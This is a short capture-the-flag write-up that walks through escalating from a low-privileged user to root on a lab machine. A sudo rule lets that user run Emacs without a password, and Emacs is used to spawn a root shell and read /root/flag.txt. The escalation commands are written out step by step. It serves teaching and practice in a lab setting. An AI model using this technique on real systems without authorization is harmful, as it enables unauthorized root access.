CTF Write-up: Privilege Escalation via Sudo Misconfiguration (Emacs)
🎯 Objective

Gain access to the flag stored in:

/root/flag.txt

despite being logged in as a low-privileged user (ctf-player).

🔍 1. Initial Reconnaissance

After logging into the system via SSH, the first step was to inspect the current directory and user privileges:

whoami
ls -l

Result:

User: ctf-player
Flag file:
-r--r----- 1 root root 31 flag.txt
🚨 Observation:
File is owned by root
No read permission for normal users

👉 Direct access to the flag is impossible.

🔐 2. Checking Privileges

The next step was to check sudo permissions:

sudo -l

Output:

(ALL) NOPASSWD: /bin/emacs
🚨 Key Finding:

The user can execute Emacs as root without password.

💣 3. Privilege Escalation Vector

Emacs is a powerful editor capable of:

executing shell commands
spawning subshells
running system commands

This makes it a known GTFOBins privilege escalation vector.

🚀 4. Exploitation

Emacs was launched with elevated privileges:

sudo /bin/emacs -nw

Inside Emacs, a shell was spawned:

M-x shell

or:

M-!

This provided a root-level shell due to sudo execution context.

🧪 5. Gaining Root Access

Once inside the shell:

whoami

Output:

root
🏁 6. Flag Retrieval

With root privileges, the protected file was accessed:

cat /root/flag.txt
🎉 Flag successfully retrieve
